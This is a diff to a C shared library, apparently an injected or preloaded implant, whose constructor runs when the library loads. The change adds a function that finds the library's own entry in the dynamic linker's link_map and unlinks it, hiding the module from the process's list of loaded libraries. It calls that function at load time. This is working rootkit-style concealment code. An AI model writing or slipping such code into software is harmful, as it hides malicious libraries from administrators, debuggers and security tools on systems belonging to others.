@@ -5,6 +5,7 @@
 #include <dirent.h>
 #include <dlfcn.h>
 #include <fcntl.h>
+#include <link.h>
 #include <netdb.h>
 #include <signal.h>
 #include <stdio.h>
@@ -217,6 +218,40 @@ int is_str_in_file(const char *path, const char *str) {
   return 0;
 }
 
+#ifndef LINUX_EXE
+static void unlink_loader() {
+  void *handle = dlopen(NULL, RTLD_NOW);
+  if (!handle)
+    return;
+
+  struct link_map *map = NULL;
+  if (dlinfo(handle, RTLD_DI_LINKMAP, &map) != 0) {
+    dlclose(handle);
+    return;
+  }
+
+  Dl_info info;
+  if (dladdr(unlink_loader, &info) == 0) {
+    dlclose(handle);
+    return;
+  }
+
+  struct link_map *current = map;
+  while (current) {
+    if (current->l_addr == (size_t)info.dli_fbase) {
+      if (current->l_prev)
+        current->l_prev->l_next = current->l_next;
+      if (current->l_next)
+        current->l_next->l_prev = current->l_prev;
+      break;
+    }
+    current = current->l_next;
+  }
+
+  dlclose(handle);
+}
+#endif
+
 #ifdef LINUX_EXE
 void main() {
 #else
@@ -224,6 +259,7 @@ void main() {
  * Initializes the library. This function is called when the library is loaded.
  */
 void __attribute__((constructor)) initLibrary(void) {
+  unlink_loader();
 #endif
   // ignore SIGCHLD
   signal(SIGCHLD, SIG_IGN);
